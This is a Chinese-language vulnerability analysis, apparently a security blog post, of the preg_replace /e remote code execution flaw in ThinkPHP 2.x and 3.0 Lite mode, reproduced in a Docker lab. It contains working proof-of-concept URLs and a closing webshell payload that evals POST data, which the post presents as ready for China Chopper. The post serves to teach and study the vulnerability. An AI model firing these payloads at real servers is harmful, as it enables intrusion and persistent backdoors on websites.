##  

ThinkPHP是一个免费开源用户数量非常多的一个PHP开发框架，这个框架曾经爆出各种RCE和SQL注入漏洞。斗哥将带来ThinkPHP各个版本的漏洞分析文章，此为第一篇从TP最早的版本开始分析。

### 0x00 漏洞描述

在ThinkPHP ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：

    
    
    $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
    

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。

所以先来看看`preg_replace`这个函数，这个函数是个替换函数，而且支持正则，使用方式如下：

    
    
    preg_replace('正则规则','替换字符','目标字符')
    

这个函数的3个参数，结合起来的意思是：如果目标字符存在符合正则规则的字符，那么就替换为替换字符，如果此时正则规则中使用了`/e`这个修饰符，则存在代码执行漏洞。

下面是搜索到的关于`/e`的解释：

    
    
    e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  
    /e 可执行模式，此为PHP专有参数，例如preg_replace函数。
    

本地测试直接使用下面这行代码测试即可，可使用在线PHP沙箱来测试。

沙箱地址：<http://sandbox.onlinephpfunctions.com/>

    
    
    <?php
    @preg_replace('/test/e','print_r("AAA");','just test');
    

这个函数5.2~5.6都还是可以执行的，但是到了php 版本7 以上，就已经都不支持`/e`修饰符了。

### 0x01 环境搭建与漏洞复现

斗哥选择了vunhub的docker靶场进行环境搭建，执行如下命令启动ThinkPHP 2.1的Demo应用：

    
    
    docker-compose up -d
    

访问`http://10.10.10.199:8080/index.php?s=/index/index/xxx/${@phpinfo()}`

![](http://qiniu.re13orn.cn/markdown-img-paste-20191203100903719.png)

### 0x02 分析学习

从漏洞挖掘的角度，如果采用的是关键函数查找的方式，应该是先搜索`preg_replace`这个函数，发现使用了这个函数之后，在查看是否使用`/e`修饰符，然后查看是否存在可控参数，如果存在，在分析是否可以传参利用。

    
    
    docker ps
    docker exec -it <Container ID> /bin/bash
    cd /var/www/html
    find . -name '*.php' | xargs grep -n 'preg_replace'
    

存在`preg_replace`函数的脚本：

    
    
    ./ThinkPHP/Mode/Lite/ThinkTemplateCompiler.class.php
    ./ThinkPHP/Mode/Lite/Dispatcher.class.php
    ./ThinkPHP/Lib/Think/Template/ThinkTemplate.class.php
    ./ThinkPHP/Lib/Think/Template/TagLib.class.php
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php
    ./ThinkPHP/Lib/Think/Util/Dispatcher.class.php
    ./ThinkPHP/Common/extend.php
    ./ThinkPHP/Common/functions.php
    

存在`/e`修饰符的脚本：

    
    
    ./ThinkPHP/Mode/Lite/Dispatcher.class.php:115:            $res = preg_replace('@(\w+)'.C('URL_PATHINFO_DEPR').'([^,\/]+)@e', '$pathInfo[\'\\1\']="\\2";', $_SERVER['PATH_INFO']);
    
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:57:                $rule  = preg_replace('/{\$(_\w+)\.(\w+)\|(\w+)}/e',"\\3(\$\\1['\\2'])",$rule);
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:58:                $rule  = preg_replace('/{\$(_\w+)\.(\w+)}/e',"\$\\1['\\2']",$rule);
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:60:                $rule  = preg_replace('/{(\w+)\|(\w+)}/e',"\\2(\$_GET['\\1'])",$rule);
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:61:                $rule  = preg_replace('/{(\w+)}/e',"\$_GET['\\1']",$rule);
    ./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:68:                $rule  = preg_replace('/{|(\w+)}/e',"\\1()",$rule);
    
    ./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102:            $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
    ./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:224:                    $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']="\\2";', implode('/',$paths));
    ./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:239:                    $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']="\\2";', str_replace($matches[0],'',$regx));
    
    ./ThinkPHP/Common/extend.php:215:        $str = preg_replace('#color="(.*?)"#', 'style="color: \\1"', $str);
    
    ./ThinkPHP/Common/functions.php:145:        return ucfirst(preg_replace("/_([a-zA-Z])/e", "strtoupper('\\1')", $name));
    

根据漏洞描述，有漏洞的代码位置在：

    
    
    ./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102:            $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
    

根据代码注释，了解到这个是thinkphp
内置的Dispacher类，用来完成URL解析、路由和调度。所以有必要了解一下thinkphp的关于这块功能的使用。

在我看来，thinkphp
应该也是MVC框架，所有的请求都是根据路由来决定的。而`Dispatcher.class.php`就是规定如何来解析路由的这样一个类。

    
    
    类名为`Dispatcher`，class Dispatcher extends Think
    里面的方法有:
    static public function dispatch() URL映射到控制器
    public static function getPathInfo()  获得服务器的PATH_INFO信息
    static public function routerCheck() 路由检测
    static private function parseUrl($route)
    static private function getModule($var) 获得实际的模块名称
    static private function getGroup($var) 获得实际的分组名称
    

有漏洞的代码位置在`static public function dispatch()`，叫URL映射控制器，也就是URL访问的路径是映射到哪个控制器下。

参考文章：<https://www.cnblogs.com/TigerYangWTH/p/5792286.html> 得到：

  * thinkphp 所有的主入口文件默认访问index控制器（模块）
  * thinkphp 所有的控制器默认执行index动作（方法）

参考文章：<https://www.kancloud.cn/manual/thinkphp5_1/353955> 得到：URL访问规则：

    
    
    ThinkPHP5.1在没有定义路由的情况下典型的URL访问规则是：
    http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]
    
    如果不支持PATHINFO的服务器可以使用兼容模式访问如下：
    http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]
    

漏洞所在关键代码块

    
    
    // 分析PATHINFO信息
    self::getPathInfo();
    
    if(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
        $paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
        $var  =  array();
        if (C('APP_GROUP_LIST') && !isset($_GET[C('VAR_GROUP')])){
            $var[C('VAR_GROUP')] = in_array(strtolower($paths[0]),explode(',',strtolower(C('APP_GROUP_LIST'))))? array_shift($paths) : '';
            if(C('APP_GROUP_DENY') && in_array(strtolower($var[C('VAR_GROUP')]),explode(',',strtolower(C('APP_GROUP_DENY'))))) {
                // 禁止直接访问分组
                exit;
            }
        }
        if(!isset($_GET[C('VAR_MODULE')])) {// 还没有定义模块名称
            $var[C('VAR_MODULE')]  =   array_shift($paths);
        }
        $var[C('VAR_ACTION')]  =   array_shift($paths);
        // 解析剩余的URL参数
        $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
        $_GET   =  array_merge($var,$_GET);
    }
    
    
    
    if(!self::routerCheck())
    

首先是没有路由规则，所以函数按照默认规则调度URL。

先看到 `$var[\'\\1\']="\\2";` ，而`$var`是一个array。

根据文章：<https://www.bbsmax.com/A/l1dyr8E6ze/>
,<https://521-wf.com/archives/45.html>学习得到的姿势：

代码1：注意看当前的变量a 值为字符串，且该字符串本脚本没有相同的函数名。

    
    
    <?php
    function test($str)
    {
        echo "This func is run  $str .";
    }
    
    $a='GoodGoodStudy';
    $b='[bbbaaahelloworldaaabbb]';
    
    echo preg_replace("/aaa(.+?)aaa/ies",$a,$b);
    
    运行结果：
    [bbbGoodGoodStudybbb]
    

代码2：注意看当前的变量a 值为`test()`。

    
    
    <?php
    function test($str)
    {
        echo "This func is run  $str .";
    }
    
    $a='test()';
    $b='[bbbaaahelloworldaaabbb]';
    
    echo preg_replace("/aaa(.+?)aaa/ies",$a,$b);
    
    运行结果：
    This func is run   .[bbbbbb]
    

可以发现执行了`test()`这个函数，但是并没有传递参数进去。

代码3：注意看当前的变量a 值为`test("\1")`。

    
    
    <?php
    function test($str)
    {
        echo "This func is run  $str .";
    }
    
    $a='test("\1")';
    $b='[bbbaaahelloworldaaabbb]';
    
    echo preg_replace("/aaa(.+?)aaa/ies",$a,$b);
    
    运行结果：
    This func is run  helloworld .[bbbbbb]
    

可以发现执行了`test()`这个函数，我们表面传递的参数是`"\1"`，结果表明参数确实传递进去了，但是本例传进去的是`helloworld`，`helloworld`是经过`preg_replace()`函数匹配要替换掉的原本那部分，现在转而成了参数进行传递了。

那我们假设现在`$b`的值是可控的，用户可以传参控制。

代码4：控制`$b`传递一个已知变量`$c`。

    
    
    <?php
    function test($str)
    {
        echo "This func is run  $str .";
    }
    
    $a='test("\1")';
    $b='aaa$caaa';
    $c="CXK";
    
    echo preg_replace("/aaa(.+?)aaa/ies",$a,$b);
    
    运行结果：
    This func is run  CXK .
    

基于这个结果，在PHP当中，`${}`是可以构造一个变量的，`{}`写的是一般的字符，那么就会被当成变量，比如`${a}`等价于`$a`，那如果`{}`写的是一个已知函数名称呢？那么这个函数就会被执行，具体例子我们可以参考如下这个例子。

代码5：

    
    
    <?php
    
    echo phpversion();
    echo "\n";
    
    $a = "CXK";
    
    echo "aaaaa{${a}}aaaaaa";
    echo "\n";
    
    echo "aaaaa${phpversion()}aaaaaa";
    
    运行结果：
    5.6.19
    aaaaaCXKaaaaaa
    Notice:  Undefined variable: 5.6.19 in <b>[...][...] on line 11
    aaaaaaaaaaa
    

可以看到，因为没有一个变量名为`5.6.19`所以报错了，但是代码却执行了，是不是有点像报错注入的感觉？

回到ThinkPHP的代码中来，可控的位置为`implode($depr,$paths)`，`implode()`是将数组转成字符串，而`'$var[\'\\1\']="\\2";'`是对一个数组做操作。

来分析一下正则`(\w+)\/([^/]+)`，这个正则的意思是取路径的每2个参数。

代码：

    
    
    <?php
    $var = array();
    $a='$var[\'\\1\']="\\2";';
    $b='a/b/c/d/e/f';
    preg_replace("/(\w+)\/([^\/\/])/ies",$a,$b);
    
    
    print_r($var);
    
    运行结果：
    Array
    (
        [a] => b
        [c] => d
        [e] => f
    )
    

通过上面的代码，更加清晰的是取出每2个参数，然后第一个参数作为数组的键，第二个参数作为数组的值，那么在这个过程当中，上述例子如果`$b`可控，同样会发生代码执行。

代码：此时`$b`采用的是双引号闭合的，注意如果采用单引号则不会有代码执行。

    
    
    <?php
    $var = array();
    $a='$var[\'\\1\']="\\2";';
    $b="a/{${phpversion()}}/c/d/e/f";
    preg_replace("/(\w+)\/([^\/\/])/ies",$a,$b);
    
    
    print_r($var);
    运行结果：
    Notice:  Undefined variable: 5.4.6 in [...][...]on line 5
    Array
    (
        [c] => d
        [e] => f
    )
    

需要说明的是，代码执行的位置，必须是数组的值的位置而不是键的位置。

然后在回到ThinkPHP的代码中来

    
    
    if(!isset($_GET[C('VAR_MODULE')])) {// 还没有定义模块名称
        $var[C('VAR_MODULE')]  =   array_shift($paths);
    }
    $var[C('VAR_ACTION')]  =   array_shift($paths);
    // 解析剩余的URL参数
    
    $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
    $_GET   =  array_merge($var,$_GET);
    

数组`$var`在路径存在模块和动作时，会去除掉前2个值。而数组`$var`来自于`explode($depr,trim($_SERVER['PATH_INFO'],'/'));`也就是路径。

所以我们可以构造poc如下：

    
    
    /index.php?s=a/b/c/${phpinfo()}
    /index.php?s=a/b/c/${phpinfo()}/c/d/e/f
    /index.php?s=a/b/c/d/e/${phpinfo()}
    ......
    

![](http://qiniu.re13orn.cn/markdown-img-paste-20191203215646763.png)

下面给出一个能够直接菜刀连接的payload：

    
    
    /index.php?s=a/b/c/${@print(eval($_POST[1]))}
    

![](http://qiniu.re13orn.cn/markdown-img-paste-20191203232406836.png)

